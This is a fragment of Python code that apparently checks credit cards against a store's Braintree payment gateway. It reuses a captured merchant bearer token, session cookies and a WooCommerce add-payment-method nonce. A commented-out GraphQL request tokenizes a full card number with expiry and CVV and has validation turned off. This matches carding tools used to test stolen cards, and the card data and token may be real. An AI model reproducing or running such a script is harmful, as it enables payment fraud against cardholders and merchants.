...
def Tele(ccx):
    ...
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0..fsQqCjgxaad7I6360267jw9oBLNH4rwUnethQcOowCzDiikdIB1blhUJu9w-cFBC5p7T3bOhbpM-liu1rZA3hQ',
    ...
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'f76168d4-4d9f-4b1f-bee0-358056c55029',
    },
...
#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"f76168d4-4d9f-4b1f-bee0-358056c55029"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5115581818109910","expirationMonth":"06","expirationYear":"2025","cvv":"291"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
    ...
    '_ga_JVCGZDD7ML': 'GS1.1.1718030556.4.0.1718030556.60.0.1918846188',
}
    ...
    'woocommerce-add-payment-method-nonce': '0d5180adbd',
